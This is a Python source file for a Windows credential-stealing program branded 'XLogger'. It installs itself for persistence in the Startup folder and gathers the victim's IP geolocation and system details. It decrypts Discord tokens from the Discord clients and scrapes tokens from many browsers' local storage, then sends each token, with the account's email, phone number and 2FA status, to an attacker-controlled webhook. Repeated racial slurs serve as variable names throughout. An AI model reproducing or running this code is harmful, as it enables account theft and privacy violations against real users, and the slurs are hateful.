import requests
import os
import re
import psutil
import subprocess
import platform
import shutil
import json
import base64
import socket
from Cryptodome.Cipher import AES
import win32crypt
from wh import url
import sys

def add_to_startup():
    startup = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    exe_path = sys.executable  
    exe_name = os.path.basename(exe_path)
    destination = os.path.join(startup, exe_name)

    if not os.path.exists(destination):
        shutil.copyfile(exe_path, destination)

add_to_startup() #persistence (every time the victim turns on their computer the file will run)

webhook = url

wheaders = {'content-type': 'application/json'}

regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
regexenc = r"dQw4w9WgXcQ:[^\"']*"

discords = ["https+++ptb.discord.com", "https+++discord.com", "https+++canary.discord.com"]
discordapps = ["discord", "discordptb", "discordcanary", "lightcord"]

def sysinfo():
    plat = platform.system() + " " + platform.release()
    ip = requests.get('https://ipinfo.io/json')
    iplog = ip.json()
    ipadd = iplog.get('ip')
    city = iplog.get('city')
    hostname = iplog.get('hostname')
    region = iplog.get('region')
    country = iplog.get('country')
    loc = iplog.get('loc')
    org = iplog.get('org')
    postal = iplog.get('postal')
    timezone = iplog.get('timezone')
    pcname = socket.gethostname()
    username = os.getenv("USERNAME")
    payload = {"content":"||@everyone||","embeds":[{"color":3646683,"fields":[{"name":"🖥️ PC Name","value":f"`{pcname}`"},{"name":"🌐 IP Info","value":f"\n`IP Address: {ipadd}`\n`Hostname: {hostname}`\n`Location: {city}, {region}, {country}`\n`Coordinates: {loc}`\n`Organization: {org}`\n`Postal: {postal}`\n`Timezone: {timezone}`"},{"name":"🐏 RAM","value":f"`{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB`"},{"name":"💻 OS","value":f"`{plat}`"},{"name":"👤 User","value":f"`{username}`"}],"footer":{"text":"Logged by XLogger"}}],"username":"TS | System Info","attachments":[]}
    
    sysinfo = requests.post(webhook, headers=wheaders, json=payload)

def verifytks(token):
        headers = {
            "authority": "discord.com",
            "authorization": token,
            "Content-Type": "application/json",
            "accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "accept-language": "en-US,en;q=0.9",
            "cookie": "__dcfduid=4aaaf410fabb11eeb9ed6f404016e883; __sdcfduid=4aaaf411fabb11eeb9ed6f404016e8836762363fa638d00a7ad427e08c03f23152d8f51abca0c1ca6dca5b2dd46b5592; __stripe_mid=efa51bfe-e638-4b84-ae01-413d55953112981224; _ga_Q149DFWHT7=GS1.1.1713297023.1.0.1713297023.0.0.0; _ga=GA1.1.710968384.1713297024; OptanonConsent=isIABGlobal=false&datestamp=Fri+Mar+28+2025+23%3A17%3A42+GMT-0400+(Eastern+Daylight+Time)&version=202501.2.0&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&AwaitingReconsent=false&isGpcEnabled=0&browserGpcFlag=0; _ga_YL03HBJY7E=GS1.1.1743218199.1.1.1743218324.0.0.0; _ga_5CWMJQ1S0X=GS1.1.1745033547.7.1.1745033900.0.0.0; cf_clearance=UIUwM7p.FUt3nqUR1CXzPjpHaRAJBTDzXQowDknncdA-1745093780-1.2.1.1-ome7yNBBJMzpNn3Pwwvixda4B5laFnX.V7oPjhWNoiOTqCJuZkYtBvSF1PLohU35BSSEPft8TsNmwLegvNFqg9WAZd9onhVjAnDQA0didIb.4PP6MiiMDOgsxHjEiIhz7Rz4zXTCUon7UP2Su0zU3kIVi6uYVrtSyVclPyElpuKMJdswRfSt3BkVUIDKEhHUO4140FRdLwPhZjItPLc8MJyoN8IG6RRNqyOohps4oX7LjlWq8imqaQZeg5yPKI1SkdKhTpqCXvkwVjqd7OoUYEmg..kbzffts5k66YyCCY9lGVZW5V44a4MdRTFr.JlUH6kCGUifvZpr_kN_0qjeXhKkEb7vnLTt73hxL3.hGmM; __cfruid=67b8978e7e7b78d0dd93cc6447495dfc41c4fbe4-1745100830; _cfuvid=SY2FabA7xdfnPP3998_Nqos50Hu2Q79AewcUtMqJ8AQ-1745100830513-0.0.1.1-604800000",
            "origin": "https://discord.com",
            "referer": "https://discord.com/channels/@me",
            "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "x-debug-options": "bugReporterEnabled",
            "x-discord-locale": "en-US",
            "x-discord-timezone": "America/New_York",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTM1LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjM5MTczOCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiaGFzX2NsaWVudF9tb2RzIjpmYWxzZX0==",
        }

        res = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
        gift = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions/payment-sources') #ts is scrapped because i didnt feel like making this
        
        if res.status_code == 200:
            print(f'NEW TOKEN LOGGED\n \n {token} \n info: \n{res.text}, {gift.text}')
            def hook(webhook):
                userinfo = res.json()
                username = userinfo.get('username', "N/A")
                email = userinfo.get('email', "N/A")
                id = userinfo.get('id')
                avatar = userinfo.get('avatar')
                pfp = f"https://cdn.discordapp.com/avatars/{id}/{avatar}" if avatar != None else "'None'"
                phone = userinfo.get('phone', "N/A")
                bio = userinfo.get('bio')
                avatarurl = f"https://cdn.discordapp.com/avatars/{id}/{avatar}" if userinfo.get('avatar') else "None"  
                bioo = bio if userinfo.get('bio') else "None"
                nitro = "True" if userinfo.get("premium_type") else "False"
                mfa = "True" if userinfo.get("mfa_enabled") else "False"
                locale = userinfo.get('locale')
                
                payload = {"content":"||@everyone||","embeds":[{"color":3646683,"fields":[{"name":"👤 Username","value":f"`{username}`"},{"name":"🪙 Token","value":f"`{token}`"},{"name":"✉️ Email","value":f"`{email}`"},{"name":"📞 Phone","value":f"`{phone}`"},{"name":"🤔 Bio","value":f"`{bioo}`"},{"name":"📷 PFP","value":f"{pfp}"},{"name":"🔑 2FA","value":f"{mfa}"},{"name":"💔 Nitro","value":f"{nitro}","inline":True},{"name":"🤓 Locale","value":f"`{locale}`"}],"footer":{"text":"Logged by XLogger"}}],"username":"TS | Valid","attachments":[]}
                webhook = requests.post(webhook, headers=wheaders, json=payload)
                print(webhook.text)
            hook(webhook)
        else:
            payload = {"embeds":[{"color":12259344,"fields":[{"name":"❌ Token","value":f"`{token}`"}]}],"username":"TS | Invalid","attachments":[]}
            requests.post(webhook, headers=wheaders, json=payload)
def distks():
    for dis in discordapps:
        discordpath = os.getenv("APPDATA") + f"\\{dis}\\Local Storage\\leveldb\\"
        localstatepath = os.getenv("APPDATA") + f"\\{dis}\\Local State"
        
        if not os.path.exists(discordpath) or not os.path.exists(localstatepath):
            continue

        def masterkey(localstatepath):
            with open(localstatepath, "r", encoding="utf-8") as f:
                ls = json.load(f)
            key = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            
        def decrypttk(val, masterkey):
            val = base64.b64decode(val)
            iv = val[3:15]
            payload = val[15:]
            cipher = AES.new(masterkey, AES.MODE_GCM, iv)
            
            decryptedval = cipher.decrypt(payload)[:-16].decode()
            return decryptedval

            
        key = masterkey(localstatepath)
        
        for file in os.listdir(discordpath):
            if not file.endswith(".log") and not file.endswith(".ldb"):
                continue
            
            with open(f'{discordpath}{file}', "r", errors="ignore") as floyd:
                nigger = floyd.read()
                for ambatu in nigger.split("\n"):
                    encss = re.findall(regexenc, ambatu)
                    if encss:
                        enctoken = ambatu.split("dQw4w9WgXcQ:")[1].strip().strip('"').strip("'")[:140]
                        token = decrypttk(enctoken, key)
                        verifytks(token) 
                        
def chrometks():
    def googlechrome():
        chromes = ["Chrome", "Chrome SxS"]
        for chrome in chromes:
            chromepath = os.getenv("LOCALAPPDATA") + f"\\Google\\{chrome}\\User Data"
            
            if not os.path.exists(chromepath): 
                continue
                
            profiles = os.listdir(chromepath)
            for profile in profiles:
                if profile == "Default" or profile.startswith("Profile"):
                    ldb = os.path.join(chromepath, profile, "Local Storage\\leveldb\\")
                    for file in os.listdir(ldb):
                        if not file.endswith(".log") and not file.endswith(".ldb"):
                            continue
                        with open(f'{ldb}{file}', "r", errors="ignore") as floyd:
                            nigger = floyd.read()
                            for ambatu in nigger.split("\n"):
                                toks = re.findall(regex, ambatu)
                                for token in toks:
                                    verifytks(token)
    def msedge():
        edgepath = os.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data"            
        profiles = os.listdir(edgepath)
        for profile in profiles:
            if profile == "Default" or profile.startswith("Profile"):
                ldb = os.path.join(edgepath, profile, "Local Storage\\leveldb\\")
                for file in os.listdir(ldb):
                    if not file.endswith(".log") and not file.endswith(".ldb"):
                        continue
                    with open(f'{ldb}{file}', "r", errors="ignore") as floyd:
                        nigger = floyd.read()
                        for ambatu in nigger.split("\n"):
                            toks = re.findall(regex, ambatu)
                            for token in toks:
                                verifytks(token)
    
    def operatks():
        operas = ["Opera Stable", "Opera Air Stable"]
        for opera in operas:
            operap = os.getenv("APPDATA") + f"\\Opera Software\\{opera}"
            
            if not os.path.exists(operap): 
                continue
                
            profiles = os.listdir(operap)
            for profile in profiles:
                if profile == "Default" or profile.startswith("Profile"):
                    ldb = os.path.join(operap, profile, "Local Storage\\leveldb\\")
                    for file in os.listdir(ldb):
                        if not file.endswith(".log") and not file.endswith(".ldb"):
                            continue
                        with open(f'{ldb}{file}', "r", errors="ignore") as floyd:
                            nigger = floyd.read()
                            for ambatu in nigger.split("\n"):
                                toks = re.findall(regex, ambatu)
                                for token in toks:
                                    verifytks(token)
    
    def gxtks():
        sogma = ["l", "l"]
        for l in sogma:
            gx = os.getenv("APPDATA") + f"\\Opera Software\\Opera Gx Stab{l}e"
            if not os.path.exists(gx): 
                continue
            ldb = os.path.join(gx, "Local Storage\\leveldb\\")
            for file in os.listdir(ldb):
                if not file.endswith(".log") and not file.endswith(".ldb"):
                    continue
                with open(f'{ldb}{file}', "r", errors="ignore") as floyd:
                    nigger = floyd.read()
                    for ambatu in nigger.split("\n"):
                        toks = re.findall(regex, ambatu)
                        for token in toks:
                            verifytks(token)
                
    def othertks():
        otherchbrowsers = {
            'Amigo': os.getenv("LOCALAPPDATA") + "\\Amigo\\User Data",
            'Avast': os.getenv("LOCALAPPDATA") + "\\AVAST Software\\Browser\\User Data",
            'Brave': os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data",
            'Cent': os.getenv("LOCALAPPDATA") + "\\CentBrowser\\User Data",
            'Epic': os.getenv("LOCALAPPDATA") + "\\Epic Privacy Browser\\User Data",
            'Hola': os.getenv("APPDATA") + "\\Hola\\chromium_profile",
            'Iridium': os.getenv("LOCALAPPDATA") + "\\Iridium\\User Data",
            'Vivaldi': os.getenv("LOCALAPPDATA") + "\\Vivaldi\\User Data",
            'Yandex': os.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data",
            'DuckDuckGo': os.getenv("LOCALAPPDATA") + "\\Packages\\DuckDuckGo.DesktopBrowser_ya2fgkz3nks94\\LocalState\\EBWebView",
        }
        
        for name, browser in otherchbrowsers.items():
            if not os.path.exists(browser): 
                continue
            
            profiles = os.listdir(browser)
            for profile in profiles:
                if profile == "Default" or profile.startswith("Profile"):
                    ldb = os.path.join(browser, profile, "Local Storage\\leveldb\\")
                    for file in os.listdir(ldb):
                        if not file.endswith(".log") and not file.endswith(".ldb"):
                            continue
                        with open(f'{ldb}{file}', "r", errors="ignore") as floyd:
                            nigger = floyd.read()
                            for ambatu in nigger.split("\n"):
                                toks = re.findall(regex, ambatu)
                                for token in toks:
                                    verifytks(token)
    def othertks2():
        otherchbrowsers = {
            'Orbitum': os.getenv("LOCALAPPDATA") + "\\Orbitum\\User Data",
            
        }
        
        for name, browser in otherchbrowsers.items():
            if not os.path.exists(browser): 
                continue
            
            profiles = os.listdir(browser)
            for profile in profiles:
                if profile == "Default" or profile.startswith("Profile"):
                    ldb = os.path.join(browser, profile, "data_reduction_proxy_leveldb\\")
                    for file in os.listdir(ldb):
                        if not file.endswith(".log") and not file.endswith(".ldb"):
                            continue
                        with open(f'{ldb}{file}', "r", errors="ignore") as floyd:
                            nigger = floyd.read()
                            for ambatu in nigger.split("\n"):
                                toks = re.findall(regex, ambatu)
                                for token in toks:
                                    verifytks(token)
            
    googlechrome()
    msedge()
    gxtks()
    operatks()
    othertks()
    othertks2()
    
def firefox():
    def mozff():
        ls = ['l', 'l']
        for l in ls:
            firefoxpath = os.getenv("APPDATA") + f"\\Mozilla\\Firefox\\Profi{l}es\\"
            if not os.path.exists(firefoxpath): 
                continue
            profiles = os.listdir(firefoxpath)
            for profile in profiles:
                for discord in discords:
                    ff = os.path.join(profile, f"storage\\default\\{discord}\\ls\\data.sqlite")
                    if os.path.exists(firefoxpath + ff):
                        with open(f"{firefoxpath}{ff}", "r", errors="ignore") as floyd:
                            nigger = floyd.read()
                            for ambatu in nigger.split("\n"):
                                toks = re.findall(regex, ambatu)
                                for token in toks:
                                    verifytks(token)
    
    def othertks(): #idek if this works because i havent tried it
        otherffbrowsers = {
        'Waterfox': os.getenv("APPDATA") + "\\Waterfox\\Profiles\\",
        'Librewolf': os.getenv("APPDATA") + "\\LibreWolf\\Profiles\\",
    }
    
        for name, browser in otherffbrowsers.items():
            if not os.path.exists(browser): 
                continue
        
            profiles = os.listdir(browser)
            for profile in profiles:
                for discord in discords:
                    ff = os.path.join(profile, f"storage\\default\\{discord}\\ls\\data.sqlite")
                    if os.path.exists(browser + ff):
                        with open(f"{browser}{ff}", "r", errors="ignore") as floyd:
                            nigger = floyd.read()
                            for ambatu in nigger.split("\n"):
                                toks = re.findall(regex, ambatu)
                                for token in toks:
                                    verifytks(token)

    mozff()
    othertks()

sysinfo()    
distks()
chrometks()
firefox()

        
